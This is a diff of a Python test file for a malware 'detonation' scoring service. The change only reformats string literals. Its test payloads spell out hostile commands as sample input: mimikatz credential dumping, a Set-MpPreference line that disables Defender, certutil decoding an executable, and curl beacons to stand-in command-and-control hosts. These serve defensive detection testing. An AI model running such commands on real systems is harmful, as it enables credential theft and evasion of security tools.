@@ -156,7 +156,7 @@ def test_detonate_text_monitor_verdict_at_medium_score(svc: DetonationService) -
 
 
 def test_detonate_text_review_verdict_high_score(svc: DetonationService) -> None:
-    payload = "lsass dump via mimikatz\n" "Set-MpPreference -DisableRealtimeMonitoring $true\n" "certutil -decode payload.txt out.exe\n" "curl https://c2.attacker.com/beacon\n"
+    payload = "lsass dump via mimikatz\nSet-MpPreference -DisableRealtimeMonitoring $true\ncertutil -decode payload.txt out.exe\ncurl https://c2.attacker.com/beacon\n"
     result = svc.detonate_text(payload)
     assert result.verdict in {"review", "block"}
     assert result.score >= 0.56
@@ -203,7 +203,7 @@ def test_detonate_text_score_never_exceeds_1(svc: DetonationService) -> None:
 
 
 def test_behavior_bonus_credential_plus_defense_evasion(svc: DetonationService) -> None:
-    payload = "lsass mimikatz credential dump\n" "Set-MpPreference -DisableRealtimeMonitoring $true\n"
+    payload = "lsass mimikatz credential dump\nSet-MpPreference -DisableRealtimeMonitoring $true\n"
     result = svc.detonate_text(payload)
     names = {s.name for s in result.signals}
     assert "credential_access" in names
@@ -212,7 +212,7 @@ def test_behavior_bonus_credential_plus_defense_evasion(svc: DetonationService) 
 
 
 def test_behavior_bonus_lolbin_plus_http_beacon(svc: DetonationService) -> None:
-    payload = "certutil -decode payload.txt out.exe\n" "curl https://c2.attacker.com/callback\n"
+    payload = "certutil -decode payload.txt out.exe\ncurl https://c2.attacker.com/callback\n"
     result = svc.detonate_text(payload)
     names = {s.name for s in result.signals}
     assert "lolbin_chain" in names
@@ -325,7 +325,7 @@ def test_confidence_increases_with_more_signals(svc: DetonationService) -> None:
 
 
 def test_confidence_bounded_below_1(svc: DetonationService) -> None:
-    payload = "lsass mimikatz sekurlsa sam hive\n" "Set-MpPreference -DisableRealtimeMonitoring $true\n" "certutil psexec schtasks wmic winrm mshta rundll32 regsvr32\n" "curl https://c2.evil.com port 4444\n" "abc.onion dns tunnel nslookup -q=txt\n" * 10
+    payload = "lsass mimikatz sekurlsa sam hive\nSet-MpPreference -DisableRealtimeMonitoring $true\ncertutil psexec schtasks wmic winrm mshta rundll32 regsvr32\ncurl https://c2.evil.com port 4444\nabc.onion dns tunnel nslookup -q=txt\n" * 10
     result = svc.detonate_text(payload)
     assert result.confidence < 1.0
 
